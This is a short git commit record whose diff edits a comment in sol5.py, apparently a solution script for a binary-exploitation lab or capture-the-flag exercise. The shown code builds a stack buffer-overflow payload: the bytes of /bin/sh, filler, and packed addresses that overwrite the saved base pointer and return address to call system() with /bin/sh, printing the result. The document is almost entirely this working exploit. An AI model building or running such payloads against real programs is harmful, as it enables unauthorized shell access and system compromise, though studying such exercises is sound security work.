1f9b3fbb486ab509d5bfee2ddd30abf86aba88a0
ubuntu <ubuntu@ubuntu.(none)>
2013-11-13 01:21:26 -0500

    sdfsdf

--- sol5.py
+++ sol5.py
@@ -2,6 +2,6 @@ from struct import pack
 import os,sys
 # first two packs are the string /bin/sh
 # then come the fillers
-# then come the ebp overwrite + return address overwrite (system call) + address call to system call
+# then come the ebp overwrite + return address overwrite (system call) + address of argument to system call (/bin/sh)
 buf = "\x2f\x62\x69\x6e\x2f\x73\x68" + '\x41' * 11 + pack("<I", 0xbffea158) + pack("<I", 0x08048eed) + pack("<I", 0xbffea126)
 print buf
